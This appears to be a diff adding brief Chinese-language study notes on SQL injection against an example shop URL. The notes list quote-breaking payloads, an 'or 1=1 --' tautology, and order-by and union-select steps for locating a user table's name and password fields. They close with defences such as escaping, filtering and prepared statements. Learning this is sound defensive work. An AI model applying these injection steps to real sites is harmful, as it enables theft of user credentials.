@@ -1,0 +1,41 @@
+SQL注入
+
+http://shop.com/?cate=computer
+cate = 
+sql = select a,b,c,d from goods where cate = '' and state = 1
+
+http://shop.com/?cate=computer'
+sql = select a,b,c,d from goods where cate = 'computer'' and state = 1
+
+sql = select a,b,c,d from goods where cate = "computer\" and state = 1
+
+payload
+'
+"
+\
+...
+
+http://shop.com/?cate=computer' or 1=1 -- 
+
+http://shop.com/?cate=computer --
+sql = select a,b,c,d from goods where cate = 'computer' or 1=1 -- ' and state = 1
+
+W3C RFC + %20
+
+检索
+
+获取 用户表的数据 union
+
+http://shop.com/?cate=computer --
+sql = select a,b from goods where cate = 'computer' order by 1 desc -- ' and state = 1
+sql = select a,b from goods where cate = 'computer' union select 'a','b' -- 
+
+1 确定select 多个字段 2
+2 确定用户表的表名 tb_user
+3 确定用户表的字段名 name pwd
+
+1 特殊字符 转义 \' \" \\  - 字符串参数
+   类型转换                   -  整数参数     
+2 特殊字符 过滤  ' " \ - 字符串参数
+  类型转换 - 整数参数
+3 SQL预处理 prepare
